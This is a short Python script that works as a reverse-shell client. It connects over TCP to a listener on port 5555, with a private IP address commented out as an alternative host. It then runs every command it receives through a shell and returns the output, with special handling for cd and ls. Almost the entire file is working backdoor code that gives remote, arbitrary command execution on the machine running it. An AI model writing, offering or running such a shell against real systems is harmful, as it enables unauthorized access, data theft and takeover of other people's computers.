#!/usr/bin/python
import os
import socket
import subprocess

os.system("clear")
# creating tcp socket as "s"
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# get the ip address of current hosting machine
host = socket.gethostname()
#host = "192.168.43.1"
port = 5555

# trying to connect to the given host and port
try:
    s.connect((host,port))
except Exception as e:
    print(e)
    exit(0)

while True:
    # storing the receiving data in a variable name "data"
    data = s.recv(1024)
    # checking if the receiving data contains the word "exit" or "quite" if so brack the  loop and exit
    if data.decode("utf-8") == 'exit' or data.decode("utf-8") == "quite":
        break
    # checking if the user trying to change dir
    elif data[:2].decode("utf-8") == "cd":
        d = str(data[3:].decode("utf-8"))
        
        try:
            os.chdir(d)
            mes = "\n[^_^] you are now in:-> {}\n".format(d)
        except:
            mes = "\n[!][!] Oops! there is no such a directory :p!!:-> {}\n".format(d)
        s.send(str.encode(mes))
    # checking if the receiv data not null(not empty)
    elif len(data) > 0:
        if data[:2].decode("utf-8") == "ls":
            data = "ls --color "+str(data[3:].decode("utf-8"))
            cmd = subprocess.Popen(data ,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_string = str(output_bytes, "utf-8")
        else:
            cmd = subprocess.Popen(data.decode("utf-8") ,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_string = str(output_bytes, "utf-8")
            # checking if the output of the receive data is null(empty)
            if len(output_string) == 0:
                output_string = "\n[^_^] done!\n"
        s.send(str.encode(output_string))
s.close()
